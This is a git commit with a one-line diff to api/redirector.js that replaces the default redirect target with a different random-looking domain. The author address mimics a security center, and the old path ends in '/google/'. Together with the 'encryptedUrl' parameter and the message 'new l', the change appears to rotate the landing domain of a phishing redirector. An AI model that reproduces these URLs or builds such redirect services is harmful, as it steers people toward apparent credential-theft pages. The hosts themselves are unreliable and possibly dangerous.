9df1c7cd461101f5139ffad15d0869500f2e89b3
“richmond” <richmond@osspesecuritycenter.com>
2025-11-25 00:57:18 +0100

    new l

--- api/redirector.js
+++ api/redirector.js
@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://harmony-314.voulastai.co.za/wIiXG2YvaRP1Kp/google/';
+    const defaultUrl = 'https://qos.paivucea.sa.com/js!Deb5G7q3pvJH/';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
